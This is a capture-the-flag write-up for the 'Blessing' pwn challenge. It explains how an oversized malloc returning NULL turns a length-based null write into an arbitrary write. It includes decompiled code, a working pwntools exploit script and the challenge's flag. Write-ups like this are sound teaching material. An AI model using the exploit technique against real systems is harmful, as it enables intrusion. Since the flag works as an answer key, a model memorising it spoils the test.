# Cyber Apocalypse CTF 2025: Tales from Eldoria

## Blessing
> In the realm of Eldoria, where warriors roam, the Dragon's Heart they seek, from bytes to byte's home. Through exploits and tricks, they boldly dare, to conquer Eldoria, with skill and flair.
 
- **Category**: Pwn 
- **Difficulty**: Very Easy
- **Author**: Cioppo

## Writeup

Let's look at the binary protections
```bash
> checksec blessing
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
```
we have full protection!

Let's look at the decompiled main
```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t size; // [rsp+8h] [rbp-28h] BYREF
  unsigned __int64 i; // [rsp+10h] [rbp-20h]
  _QWORD *v6; // [rsp+18h] [rbp-18h]
  void *buf; // [rsp+20h] [rbp-10h]
  unsigned __int64 v8; // [rsp+28h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  setup(argc, argv, envp);
  banner();
  size = 0LL;
  v6 = malloc(196608uLL);
  *v6 = 1LL;
  printstr(
    "In the ancient realm of Eldoria, a roaming bard grants you good luck and offers you a gift!\n"
    "\n"
    "Please accept this: ");
  printf("%p", v6);
  sleep(1u);
  for ( i = 0LL; i <= 0xD; ++i )
  {
    printf("\b \b");
    usleep(0xEA60u);
  }
  puts("\n");
  printf(
    "%s[%sBard%s]: Now, I want something in return...\n\nHow about a song?\n\nGive me the song's length: ",
    "\x1B[1;34m",
    "\x1B[1;32m",
    "\x1B[1;34m");
  __isoc99_scanf("%lu", &size);
  buf = malloc(size);
  printf("\n%s[%sBard%s]: Excellent! Now tell me the song: ", "\x1B[1;34m", "\x1B[1;32m", "\x1B[1;34m");
  read(0, buf, size);
  *(_QWORD *)((char *)buf + size - 1) = 0LL;
  write(1, buf, size);
  if ( *v6 )
    printf("\n%s[%sBard%s]: Your song was not as good as expected...\n\n", "\x1B[1;31m", "\x1B[1;32m", "\x1B[1;31m");
  else
    read_flag();
  return 0;
}
```
The program makes a big ``malloc`` and gives us its address, it then asks us for a size calls ``malloc`` with that number, after that it writes whatever we want on the second buffer.
Our objective is to somehow change ``v6[0]`` to something other than ``1``.

Let's look at the malloc man page:
```
DESCRIPTION
   malloc()
       The  malloc()  function  allocates size bytes and returns a pointer to the allocated memory.
       The memory is not initialized.  If size is 0, then malloc() returns a unique pointer value 
       that can later be successfully passed to free().  (See "Nonportable behavior" for portability issues.)
    ...
RETURN VALUE
       The malloc(), calloc(), realloc(), and reallocarray() functions return a pointer to the 
       allocated memory, which is suitably aligned for any type that fits into the requested size 
       or less.  On error, these functions return NULL and set errno.  Attempting to allocate 
       more than PTRDIFF_MAX bytes is considered an error, as an object  that  large  could  
       cause later pointer subtraction to overflow.
```
we can see that, when the size which needs to be allocated is big, malloc returns NULL (0), we can use this to our advantage!

Let's look at these intructions
```C
  __isoc99_scanf("%lu", &size);
  buf = malloc(size);
  // ...
  *(_QWORD *)((char *)buf + size - 1) = 0LL;
```
the last one puts byte ``0x00`` at the end of the buffer
```C
  buf[size-1] = 0LL
```
but we also know that, when malloc fails, it returns 0. We can use this as an arbitrary write:
```C
  (char*)size = 0LL
```

Knowing this, we can just send the address of the fist malloc ``+1`` and that instruction will write 0 to ``v6[0]`` for us!

So let's create a simple script for this:
```py
#!/usr/bin/env python3

from pwn import *

exe = ELF("blessing_patched")
libc = ELF("glibc/libc.so.6")
ld = ELF("glibc/ld-linux-x86-64.so.2")

context.binary = exe
# context.log_level = "debug" this prints a lot of trash!

global r
def conn():
    global r
    if args.LOCAL:
        r = process([exe.path])
    elif args.GDB:
        r = gdb.debug([exe.path])
    else:
        r = remote("addr",1337)

    return r

def main():
    conn()

    # Receive the first malloc address
    r.recvuntil(b": ")
    addr = int(r.recvuntil(b"\b", True).decode(), 16)
    r.success(f"Addr: {hex(addr)}")

    # Send that address +1
    r.sendlineafter(b": ", str(addr+1).encode())
    r.sendlineafter(b": ", b"bruh")

    # Win!
    r.interactive()

if __name__ == "__main__":
    main()
```

> HTB{3v3ryth1ng_l00k5_345y_w1th_l34k5_bbd626a96204fdc94d742b10c5e5c432}